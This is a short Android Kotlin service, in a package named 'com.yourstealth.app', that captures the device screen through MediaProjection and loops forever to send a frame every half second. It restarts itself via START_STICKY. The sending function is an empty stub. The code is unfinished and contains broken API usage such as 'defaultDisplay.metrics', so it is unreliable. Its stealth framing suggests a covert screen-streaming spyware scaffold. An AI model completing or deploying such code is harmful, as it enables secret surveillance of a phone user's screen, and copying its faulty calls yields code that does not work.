package com.yourstealth.app

import android.app.Service
import android.content.Intent
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.IBinder
import android.view.WindowManager
import kotlinx.coroutines.*

class ScreenStreamService : Service() {
    private var mProjection: MediaProjection? = null
    private var mVirtualDisplay: VirtualDisplay? = null
    private var mImageReader: ImageReader? = null
    private var mWidth = 720
    private var mHeight = 1280

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
        val data = intent?.getParcelableExtra<Intent>("data")

        if (resultCode != -1 && data != null) {
            startProjection(resultCode, data)
        }

        GlobalScope.launch {
            while (true) {
                captureAndSend()
                delay(500) // ส่งภาพทุกๆ 0.5 วินาที
            }
        }

        return START_STICKY
    }

    private fun startProjection(resultCode: Int, data: Intent) {
        val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mProjection = manager.getMediaProjection(resultCode, data)
        val metrics = (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.metrics
        mWidth = metrics.widthPixels
        mHeight = metrics.heightPixels

        mImageReader = ImageReader.newInstance(mWidth, mHeight, android.graphics.ImageFormat.RGB_565, 2)
        mVirtualDisplay = mProjection?.createVirtualDisplay("ScreenCapture", mWidth, mHeight, metrics.densityDpi, 0, mImageReader?.surface, null, null)
    }

    private fun captureAndSend() {
        // fe
    }

    override fun onDestroy() {
        mVirtualDisplay?.release()
        mProjection?.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}